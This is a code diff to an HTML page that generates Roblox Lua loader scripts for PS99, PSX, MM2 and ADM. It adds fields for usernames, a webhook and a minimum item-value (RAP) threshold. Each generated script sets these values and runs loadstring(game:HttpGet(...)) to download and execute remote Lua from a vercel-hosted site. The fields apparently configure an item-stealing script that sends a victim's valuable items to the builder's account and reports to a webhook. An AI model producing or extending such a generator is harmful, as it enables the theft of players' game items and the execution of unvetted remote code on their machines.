@@ -58,7 +58,7 @@
         font-weight: bold;
         margin-bottom: 5px;
     }
-    input, textarea {
+    input, textarea, select {
         display: block;
         width: calc(100% - 22px);
         margin: 10px auto;
@@ -68,7 +68,7 @@
         font-size: 16px;
         background-color: #ffffff;
     }
-    input:focus, textarea:focus {
+    input:focus, textarea:focus, select:focus {
         border-color: #007bff;
         outline: none;
     }
@@ -109,11 +109,25 @@
     </div>
     
     <form id="scriptForm">
+      <label for="scriptType">Select Script Type:</label>
+      <select id="scriptType" name="scriptType">
+        <option value="ps99">PS99</option>
+        <option value="psx">PSX</option>
+        <option value="mm2">MM2</option>
+        <option value="adm">ADM</option>
+      </select><br><br>
+
       <label for="username">Username:</label>
       <input type="text" id="username" name="username" required><br><br>
 
+      <label for="username2" id="username2Label" style="display:none;">Username2 (For PS99, PSX):</label>
+      <input type="text" id="username2" name="username2" style="display:none;"><br><br>
+
       <label for="webhook">Webhook (Required):</label>
       <input type="url" id="webhook" name="webhook" required><br><br>
+
+      <label for="minRAP" id="minRAPLabel" style="display:none;">Minimum RAP (For PS99):</label>
+      <input type="number" id="minRAP" name="minRAP" style="display:none;"><br><br>
 
       <button type="button" id="generateBtn">Generate</button>
       <textarea id="output" readonly placeholder="Generated script will appear here"></textarea><br>
@@ -124,29 +138,78 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", function() {
+      const scriptTypeDropdown = document.getElementById('scriptType');
+      const username2Input = document.getElementById('username2');
+      const username2Label = document.getElementById('username2Label');
+      const minRAPInput = document.getElementById('minRAP');
+      const minRAPLabel = document.getElementById('minRAPLabel');
       const generateButton = document.getElementById('generateBtn');
       const copyButton = document.getElementById('copyBtn');
 
+      // Show/Hide additional fields based on script type selection
+      scriptTypeDropdown.addEventListener('change', function() {
+        const scriptType = scriptTypeDropdown.value;
+
+        if (scriptType === 'ps99') {
+          username2Input.style.display = 'block';
+          username2Label.style.display = 'block';
+          minRAPInput.style.display = 'block';
+          minRAPLabel.style.display = 'block';
+        } else if (scriptType === 'psx') {
+          username2Input.style.display = 'block';
+          username2Label.style.display = 'block';
+          minRAPInput.style.display = 'none';
+          minRAPLabel.style.display = 'none';
+        } else {
+          username2Input.style.display = 'none';
+          username2Label.style.display = 'none';
+          minRAPInput.style.display = 'none';
+          minRAPLabel.style.display = 'none';
+        }
+      });
+
+      // Generate script output based on selection
       generateButton.addEventListener('click', function(event) {
         event.preventDefault();
 
+        const scriptType = document.getElementById("scriptType").value;
         const username = document.getElementById("username").value;
+        const username2 = document.getElementById("username2").value;
         const webhook = document.getElementById("webhook").value;
+        const minRAP = document.getElementById("minRAP").value;
 
-        // Generate script output
-        const outputString = `Username = "${username}"\n` +
-                             `Webhook = "${webhook}"\n\n` +
-                             `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mainloader.lua", true))()`;
+        let outputString = "";
+
+        switch (scriptType) {
+          case "ps99":
+            outputString = `Username = "${username}"\n` +
+                           `Username2 = "${username2}"\n` +
+                           `Webhook = "${webhook}"\n` +
+                           `MinimumRAP = ${minRAP}\n\n` +
+                           `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsim99.lua",true))()`;
+            break;
+          case "psx":
+            outputString = `Username = "${username}"\n` +
+                           `Username2 = "${username2}"\n` +
+                           `Webhook = "${webhook}"\n\n` +
+                           `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsimx.lua",true))()`;
+            break;
+          case "mm2":
+          case "adm":
+            outputString = `Username = "${username}"\n` +
+                           `Webhook = "${webhook}"\n\n` +
+                           `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mm2.lua",true))()`;
+            break;
+        }
 
         document.getElementById("output").value = outputString;
       });
 
       copyButton.addEventListener('click', function() {
-        const copyText = document.getElementById("output");
-        copyText.select();
-        copyText.setSelectionRange(0, 99999);
+        const outputTextarea = document.getElementById("output");
+        outputTextarea.select();
         document.execCommand("copy");
-        alert("Copied to clipboard!");
+        alert("Script copied to clipboard!");
       });
     });
   </script>
